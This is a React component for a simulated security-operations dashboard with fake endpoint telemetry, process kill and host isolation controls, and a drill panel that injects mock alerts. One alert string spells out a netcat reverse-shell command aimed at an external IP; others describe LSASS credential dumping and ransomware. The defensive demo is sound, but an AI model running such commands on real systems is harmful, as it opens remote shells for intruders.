import React, { useState, useEffect } from 'react';
import { 
  Laptop, 
  Activity, 
  ShieldAlert, 
  ShieldCheck, 
  Zap, 
  PowerOff, 
  RefreshCw, 
  AlertTriangle, 
  Radio, 
  Terminal, 
  CheckCircle2, 
  Play, 
  Pause, 
  Cpu, 
  HardDrive, 
  Network, 
  Search,
  Crosshair,
  Lock,
  Unlock,
  Layers,
  ArrowRight
} from 'lucide-react';

interface RealtimeProcess {
  pid: number;
  name: string;
  user: string;
  cpu: number;
  memory: string;
  path: string;
  isSuspicious?: boolean;
}

interface RealtimeEvent {
  id: string;
  timestamp: string;
  eventId: number;
  eventName: string;
  severity: 'INFO' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  details: string;
  mitreTactic?: string;
}

const INITIAL_PROCESSES: RealtimeProcess[] = [
  { pid: 1420, name: 'wazuh-agent.exe', user: 'SYSTEM', cpu: 1.2, memory: '48 MB', path: 'C:\\Program Files\\ossec-agent\\wazuh-agent.exe' },
  { pid: 892, name: 'Sysmon64.exe', user: 'SYSTEM', cpu: 0.8, memory: '34 MB', path: 'C:\\Windows\\System32\\Sysmon64.exe' },
  { pid: 4012, name: 'suricata.exe', user: 'SYSTEM', cpu: 2.1, memory: '112 MB', path: 'C:\\Program Files\\Suricata\\suricata.exe' },
  { pid: 2180, name: 'svchost.exe', user: 'NETWORK SERVICE', cpu: 0.4, memory: '24 MB', path: 'C:\\Windows\\System32\\svchost.exe' },
  { pid: 5600, name: 'chrome.exe', user: 'CORP\\analyst', cpu: 3.8, memory: '380 MB', path: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe' },
  { pid: 7810, name: 'powershell.exe', user: 'CORP\\analyst', cpu: 0.2, memory: '52 MB', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' },
];

export const SocRealtimeAgentMonitor: React.FC = () => {
  // Live agent connection state
  const [agentStatus, setAgentStatus] = useState<'CONNECTED' | 'DISCONNECTED' | 'ISOLATED'>('CONNECTED');
  const [liveStreaming, setLiveStreaming] = useState<boolean>(true);
  const [streamIntervalMs, setStreamIntervalMs] = useState<number>(1500);

  // Endpoint Vitals (Real-time oscillating metrics)
  const [cpuUsage, setCpuUsage] = useState<number>(28);
  const [memoryUsage, setMemoryUsage] = useState<number>(44);
  const [networkRx, setNetworkRx] = useState<number>(1.4);
  const [networkTx, setNetworkTx] = useState<number>(0.8);
  const [heartbeatCounter, setHeartbeatCounter] = useState<number>(0);

  // Monitored Processes
  const [processes, setProcesses] = useState<RealtimeProcess[]>(INITIAL_PROCESSES);
  const [killedPids, setKilledPids] = useState<number[]>([]);

  // Live EDR Event Stream
  const [events, setEvents] = useState<RealtimeEvent[]>([
    {
      id: 'EVT-101',
      timestamp: new Date().toLocaleTimeString(),
      eventId: 1,
      eventName: 'Process Create (Sysmon ID 1)',
      severity: 'INFO',
      details: 'cmd.exe spawned by explorer.exe with args "/c hostname"',
      mitreTactic: 'Execution (TA0002)'
    },
    {
      id: 'EVT-100',
      timestamp: new Date(Date.now() - 3000).toLocaleTimeString(),
      eventId: 3,
      eventName: 'Network Connection (Sysmon ID 3)',
      severity: 'INFO',
      details: 'wazuh-agent.exe connected to 10.0.1.5:1514 (TCP Wazuh Manager)',
      mitreTactic: 'Command & Control'
    }
  ]);

  // Action feedback message
  const [feedback, setFeedback] = useState<{ text: string; type: 'success' | 'danger' | 'info' } | null>(null);

  // Live telemetry pulse effect
  useEffect(() => {
    if (!liveStreaming) return;

    const interval = setInterval(() => {
      setHeartbeatCounter(prev => prev + 1);

      // Fluctuate metrics realistically
      setCpuUsage(prev => {
        const delta = (Math.random() * 8) - 4;
        return Math.min(95, Math.max(12, Math.round(prev + delta)));
      });

      setMemoryUsage(prev => {
        const delta = (Math.random() * 2) - 1;
        return Math.min(92, Math.max(38, Math.round(prev + delta)));
      });

      setNetworkRx(prev => Number((Math.max(0.2, prev + (Math.random() * 0.6 - 0.3))).toFixed(2)));
      setNetworkTx(prev => Number((Math.max(0.1, prev + (Math.random() * 0.4 - 0.2))).toFixed(2)));

      // Periodically add standard benign telemetry event
      if (Math.random() > 0.65) {
        const benignEvents: RealtimeEvent[] = [
          {
            id: `EVT-${Date.now().toString().slice(-4)}`,
            timestamp: new Date().toLocaleTimeString(),
            eventId: 3,
            eventName: 'Network Connection (Sysmon ID 3)',
            severity: 'INFO',
            details: 'Outbound DNS query for update.microsoft.com over 8.8.8.8:53',
            mitreTactic: 'Command & Control'
          },
          {
            id: `EVT-${Date.now().toString().slice(-4)}`,
            timestamp: new Date().toLocaleTimeString(),
            eventId: 11,
            eventName: 'File Create (Sysmon ID 11)',
            severity: 'INFO',
            details: 'svchost.exe created temporary log C:\\Windows\\Temp\\event_cache.tmp',
            mitreTactic: 'Defense Evasion'
          },
          {
            id: `EVT-${Date.now().toString().slice(-4)}`,
            timestamp: new Date().toLocaleTimeString(),
            eventId: 7,
            eventName: 'Image Loaded (Sysmon ID 7)',
            severity: 'INFO',
            details: 'chrome.exe loaded verified DLL C:\\Windows\\System32\\crypt32.dll',
            mitreTactic: 'Execution'
          }
        ];
        const randomPick = benignEvents[Math.floor(Math.random() * benignEvents.length)];
        setEvents(prev => [randomPick, ...prev.slice(0, 19)]);
      }
    }, streamIntervalMs);

    return () => clearInterval(interval);
  }, [liveStreaming, streamIntervalMs]);

  // Trigger adversarial attack simulation on monitored endpoint
  const handleSimulateAttack = (attackType: 'reverse_shell' | 'mimikatz' | 'ransomware') => {
    if (attackType === 'reverse_shell') {
      const badPid = 9240;
      const badProc: RealtimeProcess = {
        pid: badPid,
        name: 'nc.exe (Netcat Reverse Shell)',
        user: 'CORP\\analyst',
        cpu: 14.8,
        memory: '18 MB',
        path: 'C:\\Users\\analyst\\AppData\\Local\\Temp\\nc.exe',
        isSuspicious: true
      };

      setProcesses(prev => [badProc, ...prev]);
      setCpuUsage(76);

      const alertEvt: RealtimeEvent = {
        id: `EVT-${Date.now().toString().slice(-4)}`,
        timestamp: new Date().toLocaleTimeString(),
        eventId: 1,
        eventName: 'CRITICAL: Suspicious Shell Spawn (Sysmon ID 1)',
        severity: 'CRITICAL',
        details: 'nc.exe spawned with args "-e cmd.exe 45.33.32.156 4444". Active outbound C2 beacon detected!',
        mitreTactic: 'Command & Control (TA0011) • Reverse TCP Shell'
      };

      setEvents(prev => [alertEvt, ...prev]);
      setFeedback({
        text: '🚨 THREAT DETECTED: Unauthenticated Netcat reverse shell active on PID 9240! Recommended Action: Kill PID or Isolate Host.',
        type: 'danger'
      });
    } else if (attackType === 'mimikatz') {
      const alertEvt: RealtimeEvent = {
        id: `EVT-${Date.now().toString().slice(-4)}`,
        timestamp: new Date().toLocaleTimeString(),
        eventId: 10,
        eventName: 'CRITICAL: Process Access LSASS (Sysmon ID 10)',
        severity: 'CRITICAL',
        details: 'powershell.exe attempted PROCESS_VM_READ access on lsass.exe (PID 672) to harvest NTLM hashes.',
        mitreTactic: 'Credential Access (TA0006) • OS Credential Dumping'
      };

      setEvents(prev => [alertEvt, ...prev]);
      setFeedback({
        text: '🚨 CREDENTIAL DUMP ALERT: PowerShell accessed LSASS memory. Wazuh Agent blocked handle access.',
        type: 'danger'
      });
    } else if (attackType === 'ransomware') {
      setCpuUsage(89);
      const alertEvt: RealtimeEvent = {
        id: `EVT-${Date.now().toString().slice(-4)}`,
        timestamp: new Date().toLocaleTimeString(),
        eventId: 11,
        eventName: 'CRITICAL: Mass File Renaming Canary Trigger (Sysmon ID 11)',
        severity: 'CRITICAL',
        details: 'Rapid entropy changes detected. 142 files modified in Documents folder with extension ".locked".',
        mitreTactic: 'Impact (TA0040) • Data Encrypted for Impact'
      };

      setEvents(prev => [alertEvt, ...prev]);
      setFeedback({
        text: '🚨 RANSOMWARE HEURISTIC: Rapid encryption loop detected on Documents folder. Auto-isolation recommended!',
        type: 'danger'
      });
    }
  };

  // Active Response actions
  const handleKillPid = (pid: number) => {
    setKilledPids(prev => [...prev, pid]);
    setProcesses(prev => prev.filter(p => p.pid !== pid));
    setFeedback({
      text: `✓ Wazuh Active Response executed: Process PID ${pid} terminated via remote SIGKILL.`,
      type: 'success'
    });
    setTimeout(() => setFeedback(null), 4000);
  };

  const handleToggleHostIsolation = () => {
    if (agentStatus === 'ISOLATED') {
      setAgentStatus('CONNECTED');
      setFeedback({
        text: '✓ Network lockdown disabled: Host network interfaces restored to default gateway.',
        type: 'info'
      });
    } else {
      setAgentStatus('ISOLATED');
      setFeedback({
        text: '⚠️ HOST ISOLATED: Windows Firewall has quarantined all inbound & outbound ports except SOC encrypted channel (1514/TCP).',
        type: 'danger'
      });
    }
    setTimeout(() => setFeedback(null), 5000);
  };

  return (
    <div className="space-y-6 animate-in fade-in duration-300">
      {/* 1. Monitored Agent Banner */}
      <div className="p-5 rounded-2xl bg-gradient-to-r from-slate-950 via-[#071324] to-slate-950 border border-cyan-500/30 flex flex-col md:flex-row md:items-center justify-between gap-4 shadow-xl">
        <div className="flex items-center gap-3">
          <div className="relative">
            <div className="w-12 h-12 rounded-xl bg-cyan-950/80 border border-cyan-500/40 flex items-center justify-center text-cyan-400">
              <Laptop className="w-6 h-6" />
            </div>
            <span className={`absolute -bottom-1 -right-1 w-3 h-3 rounded-full ring-2 ring-slate-950 ${
              agentStatus === 'CONNECTED' ? 'bg-emerald-400 animate-pulse' : 'bg-red-500'
            }`} />
          </div>

          <div>
            <div className="flex items-center gap-2">
              <h3 className="text-base font-bold text-white font-mono">
                CyberShield-Agent-PROD-01
              </h3>
              <span className={`text-[10px] font-mono px-2 py-0.5 rounded uppercase font-semibold ${
                agentStatus === 'CONNECTED' 
                  ? 'bg-emerald-950 text-emerald-300 border border-emerald-500/40'
                  : 'bg-red-950 text-red-300 border border-red-500/40'
              }`}>
                {agentStatus}
              </span>
            </div>
            <p className="text-xs text-slate-400 font-mono mt-0.5">
              IP: <span className="text-cyan-300">192.168.1.105</span> • OS: Microsoft Windows 11 Enterprise (x64) • Agent: v4.8.2-EDR
            </p>
          </div>
        </div>

        {/* Live Controls */}
        <div className="flex items-center gap-2 flex-wrap">
          <button
            type="button"
            onClick={() => setLiveStreaming(!liveStreaming)}
            className={`px-3 py-1.5 rounded-lg text-xs font-mono flex items-center gap-1.5 transition-all cursor-pointer ${
              liveStreaming 
                ? 'bg-cyan-950/70 border border-cyan-500/50 text-cyan-300'
                : 'bg-slate-900 border border-slate-800 text-slate-400'
            }`}
          >
            {liveStreaming ? (
              <>
                <Radio className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
                <span>Live Stream: ON</span>
              </>
            ) : (
              <>
                <Pause className="w-3.5 h-3.5" />
                <span>Stream Paused</span>
              </>
            )}
          </button>

          <button
            type="button"
            onClick={handleToggleHostIsolation}
            className={`px-3.5 py-1.5 rounded-lg text-xs font-mono font-bold flex items-center gap-1.5 transition-all cursor-pointer ${
              agentStatus === 'ISOLATED'
                ? 'bg-emerald-600 hover:bg-emerald-500 text-slate-950'
                : 'bg-red-950 hover:bg-red-900 border border-red-500/50 text-red-300'
            }`}
          >
            {agentStatus === 'ISOLATED' ? (
              <>
                <Unlock className="w-3.5 h-3.5" />
                <span>Restore Network</span>
              </>
            ) : (
              <>
                <Lock className="w-3.5 h-3.5" />
                <span>Isolate Host</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Action Notification Banner */}
      {feedback && (
        <div className={`p-3.5 rounded-xl text-xs flex items-center gap-2.5 font-mono border animate-in fade-in duration-150 ${
          feedback.type === 'danger'
            ? 'bg-red-950/80 border-red-500/50 text-red-200'
            : feedback.type === 'success'
            ? 'bg-emerald-950/80 border-emerald-500/50 text-emerald-200'
            : 'bg-cyan-950/80 border-cyan-500/50 text-cyan-200'
        }`}>
          <AlertTriangle className="w-4 h-4 flex-shrink-0" />
          <span className="flex-1">{feedback.text}</span>
          <button 
            type="button" 
            onClick={() => setFeedback(null)} 
            className="text-slate-400 hover:text-white"
          >
            ✕
          </button>
        </div>
      )}

      {/* 2. Real-Time Telemetry Gauges */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-4">
        <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
          <div className="flex items-center justify-between text-xs text-slate-400 font-mono">
            <span className="flex items-center gap-1.5">
              <Cpu className="w-3.5 h-3.5 text-cyan-400" />
              <span>CPU Core Load</span>
            </span>
            <span className={`font-bold ${cpuUsage > 70 ? 'text-red-400' : 'text-cyan-300'}`}>
              {cpuUsage}%
            </span>
          </div>
          <div className="w-full bg-slate-900 h-2 rounded-full overflow-hidden">
            <div 
              className={`h-full transition-all duration-500 ${
                cpuUsage > 70 ? 'bg-red-500' : cpuUsage > 45 ? 'bg-amber-400' : 'bg-cyan-400'
              }`}
              style={{ width: `${cpuUsage}%` }}
            />
          </div>
          <p className="text-[10px] font-mono text-slate-500">8 Cores • 3.6 GHz</p>
        </div>

        <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
          <div className="flex items-center justify-between text-xs text-slate-400 font-mono">
            <span className="flex items-center gap-1.5">
              <Activity className="w-3.5 h-3.5 text-blue-400" />
              <span>Memory Usage</span>
            </span>
            <span className="font-bold text-blue-300">{memoryUsage}%</span>
          </div>
          <div className="w-full bg-slate-900 h-2 rounded-full overflow-hidden">
            <div 
              className="h-full bg-blue-500 transition-all duration-500"
              style={{ width: `${memoryUsage}%` }}
            />
          </div>
          <p className="text-[10px] font-mono text-slate-500">7.1 GB / 16.0 GB RAM</p>
        </div>

        <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
          <div className="flex items-center justify-between text-xs text-slate-400 font-mono">
            <span className="flex items-center gap-1.5">
              <Network className="w-3.5 h-3.5 text-emerald-400" />
              <span>Network I/O</span>
            </span>
            <span className="font-bold text-emerald-300">Active</span>
          </div>
          <div className="text-xs font-mono space-y-1 text-slate-300">
            <div className="flex justify-between">
              <span className="text-slate-500">Inbound:</span>
              <span>{networkRx} MB/s</span>
            </div>
            <div className="flex justify-between">
              <span className="text-slate-500">Outbound:</span>
              <span>{networkTx} MB/s</span>
            </div>
          </div>
        </div>

        <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
          <div className="flex items-center justify-between text-xs text-slate-400 font-mono">
            <span className="flex items-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-amber-400" />
              <span>EDR Rules Active</span>
            </span>
            <span className="font-bold text-amber-300">3,420</span>
          </div>
          <div className="text-xs font-mono space-y-1 text-slate-300">
            <div className="flex justify-between">
              <span className="text-slate-500">Heartbeats:</span>
              <span className="text-cyan-400">{heartbeatCounter} pulses</span>
            </div>
            <div className="flex justify-between">
              <span className="text-slate-500">FIM Watchdogs:</span>
              <span className="text-emerald-400">12 paths</span>
            </div>
          </div>
        </div>
      </div>

      {/* 3. Adversary Attack Simulation Panel */}
      <div className="p-4 rounded-xl bg-gradient-to-r from-red-950/30 via-slate-950 to-slate-950 border border-red-500/30 space-y-3">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Crosshair className="w-4 h-4 text-red-400" />
            <h4 className="text-xs font-mono font-bold text-white uppercase tracking-wider">
              Adversary Emulation Drill: Trigger Real-Time Attack
            </h4>
          </div>
          <span className="text-[10px] font-mono text-slate-400">
            Simulates real endpoint telemetry on monitored host
          </span>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
          <button
            type="button"
            onClick={() => handleSimulateAttack('reverse_shell')}
            className="p-3 rounded-xl bg-slate-900/90 hover:bg-red-950/50 border border-slate-800 hover:border-red-500/50 text-left transition-all group cursor-pointer"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs font-bold text-white group-hover:text-red-300 font-mono">
                1. Netcat Reverse Shell
              </span>
              <Terminal className="w-3.5 h-3.5 text-red-400" />
            </div>
            <p className="text-[11px] text-slate-400 leading-tight">
              Spawns nc.exe on port 4444 to external C2. Triggers Sysmon ID 1 & 3 alerts.
            </p>
          </button>

          <button
            type="button"
            onClick={() => handleSimulateAttack('mimikatz')}
            className="p-3 rounded-xl bg-slate-900/90 hover:bg-amber-950/50 border border-slate-800 hover:border-amber-500/50 text-left transition-all group cursor-pointer"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs font-bold text-white group-hover:text-amber-300 font-mono">
                2. LSASS Credential Dump
              </span>
              <AlertTriangle className="w-3.5 h-3.5 text-amber-400" />
            </div>
            <p className="text-[11px] text-slate-400 leading-tight">
              Simulates PowerShell querying LSASS process memory handles for NTLM secrets.
            </p>
          </button>

          <button
            type="button"
            onClick={() => handleSimulateAttack('ransomware')}
            className="p-3 rounded-xl bg-slate-900/90 hover:bg-purple-950/50 border border-slate-800 hover:border-purple-500/50 text-left transition-all group cursor-pointer"
          >
            <div className="flex items-center justify-between mb-1">
              <span className="text-xs font-bold text-white group-hover:text-purple-300 font-mono">
                3. Ransomware Canary
              </span>
              <Lock className="w-3.5 h-3.5 text-purple-400" />
            </div>
            <p className="text-[11px] text-slate-400 leading-tight">
              Simulates high-entropy mass file tampering in user directories.
            </p>
          </button>
        </div>
      </div>

      {/* 4. Real-Time Process Monitor & Live Event Stream (Two Columns) */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        
        {/* Left: Monitored Processes with Kill action */}
        <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-3 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between border-b border-slate-800 pb-2 mb-3">
              <span className="text-xs font-mono font-semibold text-white uppercase tracking-wider flex items-center gap-1.5">
                <Layers className="w-4 h-4 text-cyan-400" />
                <span>Active Endpoint Processes ({processes.length})</span>
              </span>
              <span className="text-[10px] font-mono text-slate-500">Live Process Tree</span>
            </div>

            <div className="space-y-2 max-h-72 overflow-y-auto pr-1">
              {processes.map((p) => (
                <div 
                  key={p.pid}
                  className={`p-2.5 rounded-lg border text-xs font-mono flex items-center justify-between transition-all ${
                    p.isSuspicious 
                      ? 'bg-red-950/60 border-red-500/60 text-red-200 animate-pulse'
                      : 'bg-slate-900/80 border-slate-800 text-slate-300'
                  }`}
                >
                  <div className="space-y-0.5 max-w-[240px]">
                    <div className="flex items-center gap-2">
                      <span className="text-cyan-400 font-bold">PID {p.pid}</span>
                      <span className="font-semibold text-white truncate">{p.name}</span>
                    </div>
                    <p className="text-[10px] text-slate-500 truncate">{p.path}</p>
                  </div>

                  <div className="flex items-center gap-3">
                    <div className="text-right text-[10px] text-slate-400">
                      <div>CPU: {p.cpu}%</div>
                      <div>{p.memory}</div>
                    </div>

                    <button
                      type="button"
                      onClick={() => handleKillPid(p.pid)}
                      className={`px-2.5 py-1 rounded text-[10px] font-bold cursor-pointer transition-colors ${
                        p.isSuspicious
                          ? 'bg-red-500 text-white hover:bg-red-600 shadow-md shadow-red-500/30'
                          : 'bg-slate-800 text-slate-300 hover:bg-red-950 hover:text-red-300'
                      }`}
                      title={`Terminate PID ${p.pid}`}
                    >
                      Kill PID
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <div className="pt-2 border-t border-slate-800/80 text-[11px] font-mono text-slate-400 flex justify-between items-center">
            <span>Parent Process: <span className="text-slate-200">services.exe (PID 600)</span></span>
            <span className="text-emerald-400">EDR Hook Active</span>
          </div>
        </div>

        {/* Right: Live Sysmon Event Stream */}
        <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-3 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between border-b border-slate-800 pb-2 mb-3">
              <span className="text-xs font-mono font-semibold text-white uppercase tracking-wider flex items-center gap-1.5">
                <Terminal className="w-4 h-4 text-emerald-400" />
                <span>Live EDR & Sysmon Event Stream</span>
              </span>
              <span className="text-[10px] font-mono text-cyan-400 flex items-center gap-1">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
                <span>Streaming</span>
              </span>
            </div>

            <div className="space-y-2 max-h-72 overflow-y-auto pr-1">
              {events.map((evt) => (
                <div 
                  key={evt.id}
                  className={`p-2.5 rounded-lg border text-xs font-mono space-y-1 transition-all ${
                    evt.severity === 'CRITICAL'
                      ? 'bg-red-950/70 border-red-500 text-red-200'
                      : evt.severity === 'HIGH'
                      ? 'bg-amber-950/60 border-amber-500/60 text-amber-200'
                      : 'bg-slate-900/60 border-slate-800/80 text-slate-300'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className={`text-[10px] font-bold px-1.5 py-0.2 rounded uppercase ${
                      evt.severity === 'CRITICAL'
                        ? 'bg-red-500 text-white'
                        : evt.severity === 'HIGH'
                        ? 'bg-amber-500 text-slate-950'
                        : 'bg-slate-800 text-slate-300'
                    }`}>
                      {evt.severity}
                    </span>
                    <span className="text-[10px] text-slate-500">{evt.timestamp}</span>
                  </div>
                  
                  <div className="font-semibold text-white text-[11px]">{evt.eventName}</div>
                  <p className="text-[10px] text-slate-300 leading-tight">{evt.details}</p>
                  
                  {evt.mitreTactic && (
                    <div className="text-[9px] text-cyan-400 pt-0.5">
                      MITRE ATT&CK: {evt.mitreTactic}
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>

          <div className="pt-2 border-t border-slate-800/80 flex items-center justify-between text-[11px] font-mono text-slate-400">
            <span>Buffer: 20 most recent events</span>
            <button
              type="button"
              onClick={() => setEvents([])}
              className="text-slate-500 hover:text-slate-300"
            >
              Clear Buffer
            </button>
          </div>
        </div>

      </div>
    </div>
  );
};
